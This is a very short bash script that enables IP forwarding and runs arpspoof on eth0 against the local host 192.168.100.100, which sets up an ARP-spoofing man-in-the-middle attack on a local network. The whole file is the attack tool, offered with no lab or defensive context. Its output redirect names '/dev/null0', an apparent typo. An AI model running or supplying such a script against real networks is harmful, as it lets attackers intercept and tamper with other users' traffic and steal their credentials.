#!/bin/bash
echo "1" > /proc/sys/net/ipv4/ip_forward

arpspoof -i eth0 192.168.100.100  > /dev/null0 2>&1 
